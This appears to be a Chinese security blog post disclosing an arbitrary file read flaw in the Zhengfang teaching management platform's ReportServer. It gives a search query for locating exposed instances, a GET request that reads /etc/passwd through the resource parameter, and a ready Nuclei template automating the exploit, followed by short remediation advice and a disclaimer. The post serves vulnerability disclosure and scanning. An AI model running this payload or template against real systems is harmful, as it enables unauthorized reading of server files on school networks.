#  【1day】正方教学管理信息服务平台ReportServer存在任意文件读取   
原创 十二  十二主神   2024-03-20 21:09  
  
**重要通知**  
  
师傅们，动动小手指，设个星标，灰常感谢  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmDcLGmeZMyZkLEUrw2iaeZRnDw5ib3EC4GVxAbSyuTkibxQuib9RJk9A648zaDfAU704r4cT6uBh7nmRA/640?wx_fmt=png&from=appmsg "")  
# 漏洞描述  
  
正方  
教学管理信息服务平台以培养、运行、保障、监控为主线，实现教务工作事务性管理和战略性管理的相互叠加，满足学校培养过程管理、教学质量检查、教学工作评价、教学业绩评价、教学改革发展等战略性需求。正方教学管理信息服务平台ReportServer存在任意文件读取漏洞，攻击者可通过该漏洞获取服务器上敏感文件内容。  
  
**资产测绘**  
```
body="正方软件股份有限公司" && title="教学管理信息服务平台"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmDcLGmeZMyZkLEUrw2iaeZRnsstDr0mQeuz00am1J9iaZnP3cRibr9wtPm2WRKNS3UAodybRgwr3viaaQ/640?wx_fmt=png&from=appmsg "")  
# 漏洞复现  
  
部分界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmDcLGmeZMyZkLEUrw2iaeZRnufVqtEP0JKh2hDB2Wc7Pia2sYInaqlOKBjGltxlMKCRib5sI724Nvmtw/640?wx_fmt=png&from=appmsg "")  
  
POC  
```
GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmDcLGmeZMyZkLEUrw2iaeZRnibBibJTMB2hhGmy2eb5moeKBGA8LIcniaGfTuIRLlIeRKFcYtria3Q1p0g/640?wx_fmt=png&from=appmsg "")  
  
**Nuclei脚本**  
```
id: zfjxgl-reportserver-anyfileread

info:
  name: zfjxgl-reportserver-anyfileread
  author: xxxx
  severity: high

http:
  - raw:
    - | 
      GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
      Host: {{Hostname}}
      Content-Type: text/plain
      Connection: close

    matchers:
      - type: dsl
        dsl:
         - status_code==200 && contains_all(body,"root")

```  
  
  
**修复建议**  
  
1  
、请联系厂商进行修复或升级到安全版本。  
  
2、如非必要，禁止公网访问该系统。  
  
3、设置白名单访问。  
  
<table><tbody style="outline: 0px;"><tr style="outline: 0px;"><td width="557" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;"><p style="outline: 0px;font-family: system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);color: rgb(34, 34, 34);"><strong style="outline: 0px;"><span style="outline: 0px;font-family: 宋体;color: red;">免责声明：</span></strong></p><p style="outline: 0px;font-family: system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);"><span style="outline: 0px;font-family: 宋体;">  </span><span style="outline: 0px;font-size: 14px;">本文章仅做网络安全技术研究使用！严禁用于非法犯罪行为，请严格遵守国家法律法规；</span><span style="outline: 0px;color: rgb(0, 0, 0);font-size: 14px;letter-spacing: 0.544px;text-decoration-style: solid;text-decoration-color: rgb(255, 0, 0);">请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。<span style="outline: 0px;letter-spacing: 0.578px;">使用本文所提供的信息或工具即视为</span></span><span style="outline: 0px;font-size: 14px;letter-spacing: 0.544px;text-decoration-style: solid;text-decoration-color: rgb(255, 0, 0);color: rgb(0, 0, 0);">同意本免责声明</span><span style="outline: 0px;color: rgb(0, 0, 0);text-decoration-style: solid;text-decoration-color: rgb(255, 0, 0);font-size: 14px;letter-spacing: 0.578px;">，并承诺遵守相关法律法规和道德规范。</span><span style="outline: 0px;font-size: 14px;letter-spacing: 0.544px;">公众号发表的一切文章如有侵权烦请私信联系告知，我们会立即删除并对您表达最诚挚的歉意！感谢您的理解！</span></p><p style="outline: 0px;"><span style="outline: 0px;font-size: 14px;letter-spacing: 0.544px;"><br style="outline: 0px;"/></span></p></td></tr></tbody></table>  
  
  
  
**交流群**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmDcLGmeZMyZkLEUrw2iaeZRnPWg70EicHqPnwNrbkMTesiaWtOnAboN3sNNibh5x0aJdMprribfjPiayJ2g/640?wx_fmt=png&from=appmsg "")  
  
  
  
